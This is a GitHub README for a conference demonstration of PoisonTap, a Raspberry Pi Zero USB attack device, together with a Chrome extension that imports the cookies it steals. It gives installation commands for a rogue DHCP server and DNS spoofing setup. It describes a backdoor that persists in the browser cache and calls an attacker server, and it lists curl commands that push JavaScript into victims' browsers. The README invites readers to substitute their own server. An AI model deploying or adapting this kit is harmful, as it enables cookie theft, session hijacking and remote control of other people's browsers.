# Demonstration of PoisonTap - FIC 2017

*PoisonTap exploit created by Samy Kamkar*

*Chrome extension for PoisonTap Cookie created by Pandhack & drouarb*

What we have done in addition to Samy Kamkar's work :
* Modified *pi_poisontap.js* to generate a file *cookies.json* with a correct json syntax
* Modified *backdoor.html* to allow the backdoor to reconnect itself automatically
* Developed a *chrome extension* to import siphoned cookies

## ChromeExtension : Installation

* Download Google Chrome
* Enter `chrome://extensions/` in the url bar
* Active `Developer Mode`
* Click on `Load unpacked extension` & select our `chrome_extension` folder

## PoisonTap : Installation / File Breakdown

*This section is an extract of Samy Kambar poisontap repository, you can read the full explanation on <a href="https://github.com/samyk/poisontap" target=_blank>https://github.com/samyk/poisontap</a>*

Note: If you find the device is NOT acting as an Ethernet controller automatically (older versions of Windows, for example), you can [change the VID and PID in pi_startup.sh](https://github.com/samyk/poisontap/issues/8#issuecomment-265818957)

```bash
# Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41
sudo bash

# If Raspbian BEFORE 2016-05-10, then run next line:
BRANCH=next rpi-update

echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
echo "dtoverlay=dwc2" >> /boot/config.txt
echo -e "dwc2\ng_ether" >> /etc/modules
sudo sed --in-place "/exit 0/d" /etc/rc.local
echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local
mkdir /home/pi/poisontap
chown -R pi /home/pi/poisontap
apt-get update && apt-get upgrade
apt-get -y install isc-dhcp-server dsniff screen nodejs
```

Place dhcpd.conf in /etc/dhcp/dhcpd.conf and the rest of the files in /home/pi/poisontap, then reboot to ensure everything is working.

There are a number of <a href="https://github.com/Pandhack/FIC_2017_PoisonTap" target=_blank>files in the repo</a>, which are used on different sides. The list:

* **backdoor.html** - Whenever a http://hostname/PoisonTap URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound websocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/PoisonTap, this is the content that gets populated (even after PoisonTap is removed from the machine).
* **backend_server.js** - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to send commands to your PoisonTapped minion machines, eg

```bash
# pop alert to victim
curl 'http://samy.pl:1337/exec?alert("muahahahaha")'
# to set a cookie on victim
curl 'http://samy.pl:1337/exec?document.cookie="key=value"'
# to force victim to load a url via ajax (note, jQuery is stored inside the backdoor)
curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",function(d)\{console.log(d)\})'
```
* **pi_poisontap.js** - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by PoisonTap, storing siphoned cookies, and injecting the cached backdoors.
* **pi_startup.sh** - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_poisontap.js above. 
* **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
* **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.
* **cookies.json** - Like *poisontap.cookies.log* it is a cookies log file but with a correct json format. Don't forget to add "[" at the begining of the file and a "]" at the end before importing the file in the chrome extension.


**NOTICE :** *You can change `samy.pl:1337` by your server's IP address with the backend.js script running*